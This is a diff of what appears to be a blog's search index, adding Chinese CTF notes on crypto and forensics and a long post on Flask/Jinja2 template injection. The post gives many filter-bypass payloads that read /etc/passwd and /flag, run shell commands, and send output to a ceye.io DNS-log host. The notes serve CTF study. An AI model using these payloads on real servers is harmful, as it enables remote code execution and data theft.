print(f&#x27;&#123;e = &#125;&#x27;)</span></span><br><span class="line"><span class="comment"># print(f&#x27;&#123;b = &#125;&#x27;)</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;N = &#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;c1 = &#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;c2 = &#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure>
 <p>获得 <span class="math inline">\(N,c_1,c_2\)</span>
 即可求解，但需要知道 <span class="math inline">\(b\)</span> 的范围</p>
@@ -15730,7 +15897,7 @@ m_1^3-c_1\equiv 0\pmod{N}\newline
 </blockquote>
 <h2 id="已知-poplus-q">已知 <span class="math inline">\(p\oplus
 q\)</span></h2>
-<h3 id="原理-18">原理</h3>
+<h3 id="原理-19">原理</h3>
 <p>已知 <span class="math inline">\(x=p\oplus q\)</span>
 的结果，就相当于一个 GF(2) 下的多项式的加法结果已知，同时又因为 <span class="math inline">\(n=pq\)</span>，故其多项式的乘法结果也已知，此时我们仅需简单爆破系数或直接构造矩阵求解即可。</p>
 <p>参考代码：<a href="https://github.com/sliedes/xor_factor">https://github.com/sliedes/xor_factor</a></p>
@@ -16728,6 +16895,9 @@ Decode 区域中的 Tweet 文本框中即可：</p>
 <img src="/text-forensics-note/tsm解密结果.png" alt="tsm解密结果">
 <figcaption aria-hidden="true">tsm解密结果</figcaption>
 </figure>
+<h1 id="twin-hex">Twin-Hex</h1>
+<p>加密结果如下所示，首先两个两个字符进行十六进制加密，随后再进行base36加密，所以特点是base36解密后只会有数字。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">58s4vb6sx6786pr6nt53n6w0</span><br></pre></td></tr></table></figure>
 <h1 id="vigenere">Vigenere</h1>
 <p>维吉尼亚的词频分析求解十分常见，这里仅给出在线求解网站，各种网站在分析性能上无孰优孰劣之分。</p>
 <ul>
@@ -16775,6 +16945,8 @@ Python 的 <code>collections.Counter</code>
 进行词频统计，一个简单的题解可能是这样的：</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> Counter</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;file.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data = f.read()</span><br><span class="line"></span><br><span class="line">c = Counter(data)</span><br><span class="line">k = c.most_common()</span><br><span class="line">k = <span class="string">&#x27;&#x27;</span>.join(i[<span class="number">0</span>] <span class="keyword">for</span> i <span class="keyword">in</span> k)</span><br><span class="line"><span class="built_in">print</span>(k)</span><br></pre></td></tr></table></figure>
 <h1 id="流量分析">流量分析</h1>
+<h2 id="winrm-数据包">WinRM 数据包</h2>
+<p><a href="https://gist.github.com/jborean93/d6ff5e87f8a9f5cb215cd49826523045">winrm_decrypt.py</a></p>
 <h2 id="ping-流量包">Ping 流量包</h2>
 <p>Ping 流量可以夹杂有效数据。</p>
 <p>正常的 Ping
@@ -20216,6 +20388,11 @@ CRC 碰撞的原理）。</p>
 算法进行压缩的话，需要使用其自带的 <code>inflate.py</code> 脚本（在
 <code>./tools/</code> 文件夹中）进行解压缩：</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python inflate.py &lt; 1.jpg &gt; 2.jpg</span><br></pre></td></tr></table></figure>
+<h2 id="长密码哈希">长密码哈希</h2>
+<p>ZIP 内部使用 PBKDF2 算法，在 AES-256 加密模式下（包括
+ZIPX），如果输入密码长度超过 64 字节，它会使用 PBKDF2
+重新生成密钥，新生成的哈希值作为文件的实际密码。</p>
+<p>换句话说，就是实际密码=SHA1(输入密码)。</p>
 <h1 id="特殊实例">特殊实例</h1>
 <h2 id="以时间戳作为密码">以时间戳作为密码</h2>
 <h3 id="原理-5">原理</h3>
@@ -22537,6 +22714,637 @@ M&amp;\newline
         <tag>crypto</tag>
         <tag>math</tag>
         <tag>lattice</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>flask-ssti笔记</title>
+    <url>//flask-ssti-note.html</url>
+    <content><![CDATA[<h1 id="flask-ssti">Flask SSTI</h1>
+<h2 id="简介">简介</h2>
+<p>Flask
+SSTI，即模板注入，旨在利用相关模板引擎的特点，通过沙箱逃逸等技术进行攻击服务，获取隐私信息。</p>
+<h2 id="信息收集">信息收集</h2>
+<h3 id="判断模板引擎类型">判断模板引擎类型</h3>
+<figure>
+<img src="/flask-ssti-note/测试流程.png" alt="测试流程">
+<figcaption aria-hidden="true">测试流程</figcaption>
+</figure>
+<p>其中，<code>Jinja2</code> 的回显是 <code>7777777</code>；</p>
+<p><code>Twig</code> 回显是 <code>49</code>。</p>
+<h3 id="config"><code>config</code></h3>
+<p><code>config</code> 是 Flask 内置的变量，
+是一个<strong>字典</strong>，用于保存 Flask
+所需的一些配置，其中最重要的是 <code>SECRET_KEY</code>。</p>
+<h3 id="request"><code>request</code></h3>
+<p><code>request</code> 是 Flask
+内置的变量，是一个对象，包含所请求的信息体，包括可以尝试访问
+<code>request.environ</code>，可以获取当前运行时的环境字典。</p>
+<p>在攻击中主要用于当中间人。</p>
+<h3 id="python-内置方法属性">Python 内置方法、属性</h3>
+<h4 id="object"><code>object</code></h4>
+<p><code>object</code> 是所有 Python
+对象（包括内置对象）的父类，可以通过 <code>object</code>
+为中间变量来寻找我们想要的东西。</p>
+<p>所拥有的内置方法和属性如下表，其子类也同样拥有</p>
+<table>
+<colgroup>
+<col style="width: 25%">
+<col style="width: 75%">
+</colgroup>
+<thead>
+<tr class="header">
+<th>名字</th>
+<th>功能</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td><code>mro()</code></td>
+<td>获取该类的 MRO，即基类列表</td>
+</tr>
+<tr class="even">
+<td><code>__annotations__</code></td>
+<td>注解</td>
+</tr>
+<tr class="odd">
+<td><code>__base__</code></td>
+<td>对象的基类</td>
+</tr>
+<tr class="even">
+<td><code>__bases__</code></td>
+<td>对象的基类元组</td>
+</tr>
+<tr class="odd">
+<td><code>__class__</code></td>
+<td>对象的类（类的类是元类）</td>
+</tr>
+<tr class="even">
+<td><code>__dict__</code></td>
+<td>对象的属性，以字典形式返回</td>
+</tr>
+<tr class="odd">
+<td><code>__doc__</code></td>
+<td>对象的文档字符串</td>
+</tr>
+<tr class="even">
+<td><code>__name__</code></td>
+<td>对象的名称（包括命名空间）</td>
+</tr>
+<tr class="odd">
+<td><code>__mro__</code></td>
+<td>同 <code>mro()</code></td>
+</tr>
+<tr class="even">
+<td><code>__subclasses__()</code></td>
+<td>获取所有子类的弱引用列表</td>
+</tr>
+<tr class="odd">
+<td><code>__init__</code></td>
+<td>类的构造函数，对于有实例的对象它将是一个（<code>function/method</code>）变量，可以做中间人</td>
+</tr>
+<tr class="even">
+<td><code>__globals__</code></td>
+<td>获取对象所在作用域的所有全局变量字典，不是所有的对象都有的，一般利用方式为
+<code>__init__.__globals__</code></td>
+</tr>
+<tr class="odd">
+<td><code>__getattribute__()</code></td>
+<td>类比 <code>getattr()</code>，可以获取对象的属性</td>
+</tr>
+<tr class="even">
+<td><code>__getitem__()</code></td>
+<td>类比 <code>[]</code>，获取字典键值</td>
+</tr>
+</tbody>
+</table>
+<h4 id="builtins__"><code>__builtins__</code></h4>
+<p><code>__builtins__</code> 是一个包含了所有 Python
+内置构建属性的模块（<code>import builtins</code>），可以通过它为中间人来间接调用其他方法。</p>
+<p>例如 <code>__builtins__.eval</code>。</p>
+<h3 id="debug-模式">debug 模式</h3>
+<p>本地调试程序，测试攻击链的时候，可以在代码中添加</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">app.deubg = <span class="literal">True</span></span><br><span class="line"><span class="comment"># 或者</span></span><br><span class="line">app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>
+<p>这样调试模式下，修改 Python
+代码时将自动修改程序，而不需要关闭服务。</p>
+<h2 id="waf-绕过">waf 绕过</h2>
+<h4 id="过滤器绕过">过滤器绕过</h4>
+<p>过滤器是模板引擎提供的一个语法糖，类似 bash
+的操作，使用管道符连接不同的过滤器，链式完成一些功能。</p>
+<blockquote>
+<p>在下文中，注释内容表示无法通过 waf
+的原代码，非注释内容表示可能的用于绕过 waf 的代码。</p>
+</blockquote>
+<h5 id="section">[]</h5>
+<p><code>[]</code> 提供另一种属性获取方式</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ().__class__</span></span><br><span class="line">()[<span class="string">&#x27;__class__&#x27;</span>]</span><br></pre></td></tr></table></figure>
+<h5 id="attr">attr</h5>
+<p>attr 用于动态获取变量，类似 Python 中的 <code>attr</code>
+函数，可以用于绕过 <code>.</code>。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># &quot;&quot;.__class__&quot;</span></span><br><span class="line"><span class="string">&quot;&quot;</span>|attr(<span class="string">&quot;__class__&quot;</span>)</span><br></pre></td></tr></table></figure>
+<h5 id="format">format</h5>
+<p>类似 Python 中 <code>str.format</code> 函数，用于作格式化字符串。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># __class__</span></span><br><span class="line"><span class="string">&quot;%c%c%c%c%c%c%c%c%c&quot;</span>|<span class="built_in">format</span>(<span class="number">95</span>,<span class="number">95</span>,<span class="number">99</span>,<span class="number">108</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">115</span>,<span class="number">95</span>,<span class="number">95</span>)</span><br></pre></td></tr></table></figure>
+<h5 id="firstlastrandom">first/last/random</h5>
+<p>获取元组或列表的第一位、最后一位、随机位</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># &quot;&quot;.__class__.__mro__[0]</span></span><br><span class="line"><span class="string">&quot;&quot;</span>.__class__.__mro__|first</span><br><span class="line"><span class="comment"># &quot;&quot;.__class__.__mro__[-1]</span></span><br><span class="line"><span class="string">&quot;&quot;</span>.__class__.__mro__|last</span><br><span class="line"><span class="string">&quot;&quot;</span>.__class__.__mro__|random</span><br></pre></td></tr></table></figure>
+<h5 id="join">join</h5>
+<p>拼接字符串，可以传入元组、列表。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># &quot;&quot;[&quot;__class__&quot;]</span></span><br><span class="line"><span class="string">&quot;&quot;</span>[[<span class="string">&#x27;__clas&#x27;</span>,<span class="string">&#x27;s__&#x27;</span>]|join]</span><br><span class="line"><span class="string">&quot;&quot;</span>[(<span class="string">&#x27;__clas&#x27;</span>,<span class="string">&#x27;s__&#x27;</span>)|join]</span><br></pre></td></tr></table></figure>
+<h5 id="lowerupper">lower/upper</h5>
+<p>大写字符串转小写字符串；小写字符串转大写字符串。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># &quot;&quot;[&quot;__class__&quot;]</span></span><br><span class="line"><span class="string">&quot;&quot;</span>[<span class="string">&quot;__CLASS__&quot;</span>|lower]</span><br></pre></td></tr></table></figure>
+<h5 id="replacereverse">replace/reverse</h5>
+<p>替换字符串；反转字符串。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># &quot;&quot;[&quot;__class__&quot;]</span></span><br><span class="line"><span class="string">&quot;&quot;</span>[<span class="string">&quot;__claee__&quot;</span>|replace(<span class="string">&quot;e&quot;</span>,<span class="string">&quot;s&quot;</span>)]</span><br><span class="line"><span class="string">&quot;&quot;</span>[<span class="string">&quot;__ssalc__&quot;</span>|reverse]</span><br></pre></td></tr></table></figure>
+<h5 id="string">string</h5>
+<p>类似 Python 的 <code>str</code>
+函数，可以将本不是字符串的类型转化为字符串，这样我们可以取字符构造
+payload</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># &lt;</span></span><br><span class="line">(().__class__|string)[<span class="number">0</span>]</span><br></pre></td></tr></table></figure>
+<h5 id="selectunique">select/unique</h5>
+<p>可以转化为迭代器对象，一般用于构造文字</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># &lt;generator object select_or_reject at 0x0000013163CDC2E0&gt;</span></span><br><span class="line">()|select|string</span><br><span class="line"><span class="comment"># _</span></span><br><span class="line">()|select|string[<span class="number">24</span>]</span><br></pre></td></tr></table></figure>
+<h5 id="其他">其他</h5>
+<p>除此之外还有很多过滤器，需要根据实际情况来取方便构造的。</p>
+<ul>
+<li>default()</li>
+<li>escape()</li>
+<li>first()</li>
+<li>last()</li>
+<li>length()</li>
+<li>random()</li>
+<li>safe()</li>
+<li>trim()</li>
+<li>max()</li>
+<li>min()</li>
+<li>unique()</li>
+<li>striptags()</li>
+<li>urlize()</li>
+<li>wordcount()</li>
+<li>tojson()</li>
+<li>truncate()</li>
+</ul>
+<h4 id="payload">payload</h4>
+<h5 id="绕过.">绕过<code>.</code></h5>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ().__class__</span></span><br><span class="line">()[<span class="string">&#x27;__class__&#x27;</span>]</span><br><span class="line">()|attr(<span class="string">&quot;__class__&quot;</span>)</span><br></pre></td></tr></table></figure>
+<h5 id="绕过引号">绕过引号</h5>
+<p>可以使用 <code>request</code>，通过获取参数的方式绕过输入引号。</p>
+<p>例如 GET 方法传参、POST 方法传参、Cookie 传参。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># GET</span></span><br><span class="line">&#123;&#123;().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">80</span>].__init__.__globals__.__builtins__[request.args.arg1](request.args.arg2).read()&#125;&#125;&amp;arg1=<span class="built_in">open</span>&amp;arg2=/etc/passwd</span><br><span class="line"><span class="comment"># POST: arg1=open&amp;arg2=/etc/passwd</span></span><br><span class="line">&#123;&#123;().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">80</span>].__init__.__globals__.__builtins__[request.values.arg1](request.values.arg2).read()&#125;&#125;</span><br><span class="line"><span class="comment"># Cookie: arg1=open;arg2=/etc/passwd</span></span><br><span class="line">&#123;&#123;().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">80</span>].__init__.__globals__.__builtins__[request.cookies.arg1](request.cookies.arg2).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>利用 <code>chr</code> 绕过字符串输入，但是首先得先找到
+<code>chr</code> 函数。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># &#123;&#123;&quot;&quot;.__class__.__bases__[0].__subclasses__()[128].__init__.__globals__[&#x27;popen&#x27;](&#x27;whoami&#x27;).read()&#125;&#125;</span></span><br><span class="line"><span class="comment"># 使用chr和%2b(+)拼接字符串代替直接使用字符串</span></span><br><span class="line">&#123;%<span class="built_in">set</span> <span class="built_in">chr</span>=[].__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">80</span>].__init__.__globals__.__builtins__.<span class="built_in">chr</span>%&#125;&#123;&#123;[].__class__.__base__.__subclasses__()[<span class="number">133</span>].__init__.__globals__[<span class="built_in">chr</span>(<span class="number">112</span>)%2bchr(<span class="number">111</span>)%2bchr(<span class="number">112</span>)%2bchr(<span class="number">101</span>)%2bchr(<span class="number">110</span>)](<span class="built_in">chr</span>(<span class="number">119</span>)%2bchr(<span class="number">104</span>)%2bchr(<span class="number">111</span>)%2bchr(<span class="number">97</span>)%2bchr(<span class="number">109</span>)%2bchr(<span class="number">105</span>)).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+<h5 id="过滤">过滤<code>()</code></h5>
+<p>执行函数必须使用小括号，无法绕过，只能查看CONFIG。</p>
+<h5 id="过滤_">过滤<code>_</code></h5>
+<p>十六进制编码、<code>unicode</code> 编码绕过</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;()[<span class="string">&quot;\x5f\x5fclass\x5f\x5f&quot;</span>][<span class="string">&quot;\x5f\x5fbases\x5f\x5f&quot;</span>][<span class="number">0</span>][<span class="string">&quot;\x5f\x5fsubclasses\x5f\x5f&quot;</span>]()[<span class="number">133</span>][<span class="string">&quot;\x5f\x5finit\x5f\x5f&quot;</span>][<span class="string">&quot;\x5f\x5fglobals\x5f\x5f&quot;</span>][<span class="string">&#x27;popen&#x27;</span>](<span class="string">&#x27;whoami&#x27;</span>)[<span class="string">&#x27;read&#x27;</span>]()&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>全字符串替换脚本</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;__class__&#x27;</span></span><br><span class="line">result = <span class="string">&#x27;&#x27;</span>.join(<span class="string">f&#x27;\\x<span class="subst">&#123;i:02x&#125;</span>&#x27;</span> <span class="keyword">for</span> i <span class="keyword">in</span> payload)</span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure>
+<p>特殊情况下可以尝试 base64 绕过（似乎不是 Jinja2）</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;[].__getattribute__(<span class="string">&#x27;X19jbGFzc19f&#x27;</span>.decode(<span class="string">&#x27;base64&#x27;</span>)).__base__.__subclasses__()[<span class="number">40</span>](<span class="string">&quot;/etc/passwd&quot;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>半角全角替换脚本</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&quot;__class__&quot;</span></span><br><span class="line">result = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(i+<span class="number">0xfee0</span>) <span class="keyword">if</span> <span class="number">33</span> &lt; i &lt; <span class="number">127</span> <span class="keyword">else</span> <span class="built_in">chr</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> payload)</span><br><span class="line"><span class="comment"># result = result.replace(&#x27; &#x27;, &#x27;\u3000&#x27;)</span></span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure>
+<h5 id="关键字过滤">关键字过滤</h5>
+<p>大小写混写</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">()[<span class="string">&#x27;__ClAss__&#x27;</span>|lower]</span><br></pre></td></tr></table></figure>
+<p>拼接字符串</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;()[<span class="string">&#x27;__cla&#x27;</span>+<span class="string">&#x27;ss__&#x27;</span>].__bases__[<span class="number">0</span>]&#125;&#125;</span><br><span class="line">&#123;&#123;()[<span class="string">&#x27;__cla&#x27;</span><span class="string">&#x27;ss__&#x27;</span>].__bases__[<span class="number">0</span>]&#125;&#125;</span><br><span class="line">&#123;&#123;()|attr([<span class="string">&quot;_&quot;</span>*<span class="number">2</span>,<span class="string">&quot;cla&quot;</span>,<span class="string">&quot;ss&quot;</span>,<span class="string">&quot;_&quot;</span>*<span class="number">2</span>]|join)&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>格式化字符串</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;()|attr(request.args.f|<span class="built_in">format</span>(request.args.a))&#125;&#125;&amp;f=__c%sass__&amp;a=l</span><br></pre></td></tr></table></figure>
+<p>过滤了 <code>__init__</code> 函数，可以考虑用 <code>__enter__</code>
+或 <code>__exit__</code> 函数替代。</p>
+<p>过滤了 <code>config</code>，可以考虑通过其他方式获取</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># &lt;TemplateReference None&gt;</span></span><br><span class="line">self</span><br><span class="line"><span class="comment"># 同样可以获取全局上下文</span></span><br><span class="line">self.__dict__._TemplateReference__context</span><br><span class="line">self.__dict__._TemplateReference__context.config</span><br><span class="line">url_for.__globals__[<span class="string">&#x27;current_app&#x27;</span>].config</span><br><span class="line">get_flashed_messages.__globals__[<span class="string">&#x27;current_app&#x27;</span>].config</span><br></pre></td></tr></table></figure>
+<h5 id="过滤-1">过滤<code>[]</code></h5>
+<p>如果是需要索引，可以使用
+<code>pop()</code>，<code>__getitem__()</code> 代替</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">().__class__.__base__.__subclasses__().__getitem__(<span class="number">133</span>).__init__.__globals__.popen(<span class="string">&#x27;whoami&#x27;</span>).read()</span><br><span class="line"></span><br><span class="line">().__class__.__base__.__subclasses__().pop(<span class="number">433</span>).__init__.__globals__.popen(<span class="string">&#x27;whoami&#x27;</span>).read()</span><br></pre></td></tr></table></figure>
+<p>如果是获取对象无法使用 <code>[]</code> 绕过，考虑使用
+<code>__getattribute__</code></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&quot;</span>.__getattribute__(<span class="string">&quot;__cla&quot;</span>+<span class="string">&quot;ss__&quot;</span>).__base__</span><br></pre></td></tr></table></figure>
+<p>最好使用 <code>request</code> 绕过</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;().__getattribute__(request.args.arg1).__base__&#125;&#125;&amp;arg1=__class__</span><br><span class="line">&#123;&#123;().__getattribute__(request.args.arg1).__base__.__subclasses__().pop(<span class="number">133</span>).__init__.__globals__.popen(request.args.arg2).read()&#125;&#125;&amp;arg1=__class__&amp;arg2=whoami</span><br></pre></td></tr></table></figure>
+<h5 id="过滤-2">过滤<code>&#123;&#125;</code></h5>
+<p>用控制语句 <code>&#123;%%&#125;</code> 代替，可以在
+<code>&#123;%%&#125;</code>
+内嵌套函数或是条件语句、循环语句等，一般会使用
+<code>&#123;%print(qsdz)%&#125;</code></p>
+<p>print 标记</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;%<span class="built_in">print</span> ().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">80</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()&quot;</span>)%&#125;</span><br></pre></td></tr></table></figure>
+<h5 id="dnslog-外带数据">dnslog 外带数据</h5>
+<p>利用 <a href="http://ceye.io/">http://ceye.io/</a> 实时监控
+dnslog，实现巧妙的盲注。</p>
+<blockquote>
+<p>ceye.io 注册后会给予二级域名，<a href="https://betheme.net/a/2493006.html">https://betheme.net/a/2493006.html</a></p>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;% <span class="keyword">if</span> lipsum.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;curl `whoami`.qureyl.ceye.io&#x27;</span>)%&#125;<span class="number">1</span>&#123;%endif%&#125;</span><br></pre></td></tr></table></figure>
+<p>但是需要注意特殊字符无法直接回显，可以考虑进行 base64 加密。</p>
+<h5 id="过滤数字">过滤数字</h5>
+<p>直接通过循环查找能利用的类</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() %&#125;&#123;% <span class="keyword">if</span> i.__name__==<span class="string">&#x27;Popen&#x27;</span> %&#125;&#123;&#123; i.__init__.__globals__.__getitem__(<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;cat flag&#x27;</span>).read()&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
+<p>或者使用 <code>lipsum</code> 基本都是字典或对象</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;lipsum|attr(<span class="string">&quot;__globals__&quot;</span>)|attr(<span class="string">&quot;__getitem__&quot;</span>)(<span class="string">&quot;os&quot;</span>)|attr(<span class="string">&quot;popen&quot;</span>)(<span class="string">&quot;cat flag&quot;</span>)|attr(<span class="string">&quot;read&quot;</span>)()&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>或者还可以构造数字进行拼接</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;%<span class="built_in">set</span> zero=([]|string|<span class="built_in">list</span>).index(<span class="string">&#x27;[&#x27;</span>)%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> one=<span class="built_in">dict</span>(a=a)|join|count%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> two=<span class="built_in">dict</span>(aa=a)|join|count%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> three=<span class="built_in">dict</span>(aaa=a)|join|count%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> four=<span class="built_in">dict</span>(aaaa=a)|join|count%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> five=<span class="built_in">dict</span>(aaaaa=a)|join|count%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> six=<span class="built_in">dict</span>(aaaaaa=a)|join|count%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> seven=<span class="built_in">dict</span>(aaaaaaa=a)|join|count%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> eight=<span class="built_in">dict</span>(aaaaaaaa=a)|join|count%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> nine=<span class="built_in">dict</span>(aaaaaaaaa=a)|join|count%&#125;</span><br><span class="line"><span class="comment"># 258</span></span><br><span class="line">&#123;% <span class="built_in">set</span> erwuba=(two~five~eight)|<span class="built_in">int</span> %&#125;</span><br></pre></td></tr></table></figure>
+<h5 id="盲注">盲注</h5>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"> </span><br><span class="line">url = <span class="string">&#x27;http://127.0.0.1:5000/?name=&#x27;</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">payload</span>):</span><br><span class="line">    r = requests.get(url+payload).content</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;kawhi&#x27;</span> <span class="keyword">in</span> r</span><br><span class="line"> </span><br><span class="line">password  = <span class="string">&#x27;&#x27;</span></span><br><span class="line">s = <span class="string">r&#x27;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!&quot;$\&#x27;()*+,-./:;&lt;=&gt;?@[\\]^`&#123;|&#125;~\&#x27;&quot;_%&#x27;</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> s:</span><br><span class="line">        payload = <span class="string">&#x27;&#123;% if ().__class__.__bases__[0].__subclasses__()[80].__init__.__globals__.__builtins__.open(&quot;/flag&quot;).read()[&#x27;</span>+<span class="built_in">str</span>(i)+<span class="string">&#x27;:&#x27;</span>+<span class="built_in">str</span>(i+<span class="number">1</span>)+<span class="string">&#x27;] == &quot;&#x27;</span>+c+<span class="string">&#x27;&quot; %&#125;kawhi&#123;% endif %&#125;&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> check(payload):</span><br><span class="line">            password += c</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span> password</span><br></pre></td></tr></table></figure>
+<h5 id="env">env</h5>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&quot;&quot;</span>.__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">128</span>].__init__.__globals__[<span class="string">&#x27;popen&#x27;</span>](<span class="string">&#x27;env&#x27;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+<h5 id="popen"><code>popen</code></h5>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&quot;&quot;</span>.__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">128</span>].__init__.__globals__[<span class="string">&#x27;popen&#x27;</span>](<span class="string">&#x27;whoami&#x27;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+<h5 id="subprocess.popen"><code>subprocess.Popen</code></h5>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&quot;&quot;</span>.__class__.__base__.__subclasses__()[<span class="number">485</span>](<span class="string">&#x27;whoami&#x27;</span>,shell=<span class="literal">True</span>,stdout=-<span class="number">1</span>).communicate()[<span class="number">0</span>].strip()&#125;&#125;</span><br></pre></td></tr></table></figure>
+<h5 id="import__os"><code>__import__('os')</code></h5>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&quot;&quot;</span>.__class__.__base__.__subclasses__()[<span class="number">80</span>].__init__.__globals__.<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;whoami&#x27;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+<h5 id="builtins__代码执行"><code>__builtins__</code>代码执行</h5>
